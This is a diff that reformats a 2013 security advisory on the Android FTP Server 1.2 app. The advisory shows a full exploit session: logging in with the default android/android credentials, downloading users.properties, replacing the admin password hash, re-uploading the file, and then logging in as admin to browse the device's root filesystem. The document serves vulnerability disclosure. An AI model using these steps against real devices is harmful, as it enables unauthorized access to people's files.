@@ -1,119 +1,124 @@
-                                Advisory #: 35
-Title: Remote access to Android ftp server 1.2 configuration file allows login
-as admin
-Author:Larry W. Cashdollar, @_larry0
-Date: 2013-09-17
-Download Site: http://www.amazon.com/888bid-com-Android-FTP-Server/dp/
-B00COVVAZM/
-Vendor:
-Vendor Notified: 2013-09-17
-Vendor Contact:
-Description: Transfer files between Android devices and computers without a USB
-cable and Windows software driver. Transfer files to and from your Android
-device over the Internet. Use Windows Explorer to transfer files between your
-Android device and your computer by drag and drop. You can add additional users
-with read only permission for download, and read and write permission for both
-upload and download."
-Vulnerability:
-Software installs with default user credentials android/android. This allows
-remote attackers to trivially gain access to the devices storage. ftp server
-exposes configuration file and allows read/write. Allowing a remote user to
-overwrite the credentials for admin login giving further access to the file
-system on the device. The application is sandboxed however so impact is
-limited.
-CVE-
-JSON:Export
-Exploit Code:
-   1. Edit the users.properties file and re-upload.
-   2.  
-   3. Connected to 192.168.0.29.
-   4. 220 Service ready for new user.
-   5. Name (192.168.0.29:larry): android
-   6. 331 User name okay, need password for android.
-   7. Password:
-   8. 230 User logged in, proceed.
-   9. Remote system type is UNIX.
-  10. ftp> cd ftpConfig
-  11. 250 Directory changed to /ftpConfig
-  12. ftp> ls
-  13. 229 Entering Passive Mode (|||49825|)
-  14. 150 File status okay; about to open data connection.
-  15. -rw-------   1 user group          679 Sep  7 16:37 users.properties
-  16. 226 Closing data connection.
-  17. ftp> get users.properties
-  18. local: users.properties remote: users.properties
-  19. 229 Entering Passive Mode (|||59616|)
-  20. 150 File status okay; about to open data connection.
-  21. 100% |********************************************|   695        9.60
-      MiB/s    --:-- ETA
-  22. 226 Transfer complete.
-  23. 695 bytes received in 00:00 (121.85 KiB/s)
-  24. ftp>
-  25. If we take a look at the users.properties file:
-  26. #Generated file - don't edit (please)
-  27. #Sat Sep 07 16:13:44 EDT 2013
-  28. ftpserver.user.android.enableflag=true
-  29. ftpserver.user.admin.maxloginnumber=0
-  30. ftpserver.user.android.writepermission=true
-  31. ftpserver.user.android.idletime=0
-  32. ftpserver.user.admin.homedirectory=/mnt/sdcard <-change to /
-  33. ftpserver.user.admin.writepermission=true
-  34. ftpserver.user.admin.maxloginperip=0
-  35. ftpserver.user.android.homedirectory=/sdcard
-  36. ftpserver.user.admin.userpassword=21232F297A57A5A743894A0E4A801FC3 <-
-      replace with 23594328\:070A6394BF17CD0A401F12ACC021714F 'android'
-      password [1]
-  37. ftpserver.user.admin.downloadrate=0
-  38. ftpserver.user.admin.enableflag=true
-  39. ftpserver.user.admin.idletime=0
-  40. ftpserver.user.admin.uploadrate=0
-  41. ftpserver.user.android.userpassword=23594328\:
-      070A6394BF17CD0A401F12ACC021714F
-  42. upload file as android/android user to ftpConfig/users.properties The
-      next time the ftp server is started (on/off button in app interface) you
-      can login as admin.
-  43.  
-  44. login as admin/android
-  45.  
-  46. ftp> user admin
-  47. 331 User name okay, need password for admin. Password:
-  48. 230 User logged in, proceed.
-  49. Remote system type is UNIX.
-  50. ftp> dir
-  51. 229 Entering Passive Mode (|||52585|)
-  52. 150 File status okay; about to open data connection.
-  53.  
-  54. dr-x------   3 user group            0 Jul 11 20:09 acct
-  55. d--x------   3 user group            0 Aug 17 09:09 cache
-  56. d--x------   3 user group            0 Jul 11 20:09 config
-  57. dr-x------   3 user group            0 Dec 31  1969 d
-  58. d--x------   3 user group            0 Sep 16  2012 data
-  59. dr-x------   3 user group            0 Jul 11 20:15 dev
-  60. d--x------   3 user group            0 Sep  2 14:07 dropbox
-  61. dr-x------   3 user group            0 Mar 29 13:48 etc
-  62. dr-x------   3 user group            0 Jul 11 20:09 mnt
-  63. dr-x------   3 user group            0 Dec 31  1969 proc
-  64. d--x------   3 user group            0 Feb 26  2013 root
-  65. d--x------   3 user group            0 Dec 31  1969 sbin
-  66. drwx------   3 user group            0 Sep  7 15:09 sdcard
-  67. dr-x------   3 user group            0 Jul 11 20:09 sys
-  68. dr-x------   3 user group            0 Mar 29 13:49 system
-  69. dr-x------   3 user group            0 Mar 29 13:49 vendor
-  70. -r--------   1 user group          118 Dec 31  1969 default.prop
-  71. ----------   1 user group        94200 Dec 31  1969 init
-  72. ----------   1 user group         1677 Dec 31  1969 init.goldfish.rc
-  73. ----------   1 user group        11658 Dec 31  1969 init.omap4430.rc
-  74. ----------   1 user group        14869 Dec 31  1969 init.rc
-  75. -r--------   1 user group            0 Dec 31  1969 ueventd.goldfish.rc
-  76. -r--------   1 user group          840 Dec 31  1969 ueventd.omap4430.rc
-  77. -r--------   1 user group         4203 Dec 31  1969 ueventd.rc
-  78. 226 Closing data connection.
-  79. ftp>
-  80.  
-  81.  
-  82. Tested on kindle fire & droid bionic.
-  83. [1] MD5 of admin, http://www.md5-hash.com/md5-hashing-decrypt/
-      21232f297a57a5a743894a0e4a801fc3 but didn't allow me to login when I used
-      admin/admin.
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisories/ftpd_android_vulnerabilities.html
+
+                               Advisory #: 35
+
+   Title: Remote access to Android ftp server 1.2 configuration file
+   allows login as admin
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2013-09-17
+   Download Site:
+   http://www.amazon.com/888bid-com-Android-FTP-Server/dp/B00COVVAZM/
+   Vendor:
+   Vendor Notified: 2013-09-17
+   Vendor Contact:
+   Description: Transfer files between Android devices and computers
+   without a USB cable and Windows software driver. Transfer files to and
+   from your Android device over the Internet. Use Windows Explorer to
+   transfer files between your Android device and your computer by drag
+   and drop. You can add additional users with read only permission for
+   download, and read and write permission for both upload and download."
+   Vulnerability:
+   Software installs with default user credentials android/android. This
+   allows remote attackers to trivially gain access to the devices
+   storage. ftp server exposes configuration file and allows read/write.
+   Allowing a remote user to overwrite the credentials for admin login
+   giving further access to the file system on the device. The application
+   is sandboxed however so impact is limited.
+   CVE-
+   JSON: Export
+   Exploit Code:
+
+    1. Edit the users.properties file and re-upload.
+    2.
+    3. Connected to 192.168.0.29.
+    4. 220 Service ready for new user.
+    5. Name (192.168.0.29:larry): android
+    6. 331 User name okay, need password for android.
+    7. Password:
+    8. 230 User logged in, proceed.
+    9. Remote system type is UNIX.
+   10. ftp> cd ftpConfig
+   11. 250 Directory changed to /ftpConfig
+   12. ftp> ls
+   13. 229 Entering Passive Mode (|||49825|)
+   14. 150 File status okay; about to open data connection.
+   15. -rw------- 1 user group 679 Sep 7 16:37 users.properties
+   16. 226 Closing data connection.
+   17. ftp> get users.properties
+   18. local: users.properties remote: users.properties
+   19. 229 Entering Passive Mode (|||59616|)
+   20. 150 File status okay; about to open data connection.
+   21. 100% |********************************************| 695 9.60 MiB/s
+       --:-- ETA
+   22. 226 Transfer complete.
+   23. 695 bytes received in 00:00 (121.85 KiB/s)
+   24. ftp>
+   25. If we take a look at the users.properties file:
+   26. #Generated file - don't edit (please)
+   27. #Sat Sep 07 16:13:44 EDT 2013
+   28. ftpserver.user.android.enableflag=true
+   29. ftpserver.user.admin.maxloginnumber=0
+   30. ftpserver.user.android.writepermission=true
+   31. ftpserver.user.android.idletime=0
+   32. ftpserver.user.admin.homedirectory=/mnt/sdcard <-change to /
+   33. ftpserver.user.admin.writepermission=true
+   34. ftpserver.user.admin.maxloginperip=0
+   35. ftpserver.user.android.homedirectory=/sdcard
+   36. ftpserver.user.admin.userpassword=21232F297A57A5A743894A0E4A801FC3
+       <- replace with 23594328\:070A6394BF17CD0A401F12ACC021714F
+       'android' password [1]
+   37. ftpserver.user.admin.downloadrate=0
+   38. ftpserver.user.admin.enableflag=true
+   39. ftpserver.user.admin.idletime=0
+   40. ftpserver.user.admin.uploadrate=0
+   41. ftpserver.user.android.userpassword=23594328\:070A6394BF17CD0A401F1
+       2ACC021714F
+   42. upload file as android/android user to ftpConfig/users.properties
+       The next time the ftp server is started (on/off button in app
+       interface) you can login as admin.
+   43.
+   44. login as admin/android
+   45.
+   46. ftp> user admin
+   47. 331 User name okay, need password for admin. Password:
+   48. 230 User logged in, proceed.
+   49. Remote system type is UNIX.
+   50. ftp> dir
+   51. 229 Entering Passive Mode (|||52585|)
+   52. 150 File status okay; about to open data connection.
+   53.
+   54. dr-x------ 3 user group 0 Jul 11 20:09 acct
+   55. d--x------ 3 user group 0 Aug 17 09:09 cache
+   56. d--x------ 3 user group 0 Jul 11 20:09 config
+   57. dr-x------ 3 user group 0 Dec 31 1969 d
+   58. d--x------ 3 user group 0 Sep 16 2012 data
+   59. dr-x------ 3 user group 0 Jul 11 20:15 dev
+   60. d--x------ 3 user group 0 Sep 2 14:07 dropbox
+   61. dr-x------ 3 user group 0 Mar 29 13:48 etc
+   62. dr-x------ 3 user group 0 Jul 11 20:09 mnt
+   63. dr-x------ 3 user group 0 Dec 31 1969 proc
+   64. d--x------ 3 user group 0 Feb 26 2013 root
+   65. d--x------ 3 user group 0 Dec 31 1969 sbin
+   66. drwx------ 3 user group 0 Sep 7 15:09 sdcard
+   67. dr-x------ 3 user group 0 Jul 11 20:09 sys
+   68. dr-x------ 3 user group 0 Mar 29 13:49 system
+   69. dr-x------ 3 user group 0 Mar 29 13:49 vendor
+   70. -r-------- 1 user group 118 Dec 31 1969 default.prop
+   71. ---------- 1 user group 94200 Dec 31 1969 init
+   72. ---------- 1 user group 1677 Dec 31 1969 init.goldfish.rc
+   73. ---------- 1 user group 11658 Dec 31 1969 init.omap4430.rc
+   74. ---------- 1 user group 14869 Dec 31 1969 init.rc
+   75. -r-------- 1 user group 0 Dec 31 1969 ueventd.goldfish.rc
+   76. -r-------- 1 user group 840 Dec 31 1969 ueventd.omap4430.rc
+   77. -r-------- 1 user group 4203 Dec 31 1969 ueventd.rc
+   78. 226 Closing data connection.
+   79. ftp>
+   80.
+   81.
+   82. Tested on kindle fire & droid bionic.
+   83. [1] MD5 of admin,
+       http://www.md5-hash.com/md5-hashing-decrypt/21232f297a57a5a743894a0
+       e4a801fc3 but didn't allow me to login when I used admin/admin.
+
+   Screen Shots:
+   Advisory:
+   http://www.vapid.dhs.org/advisories/ftpd_android_vulnerabilities.html
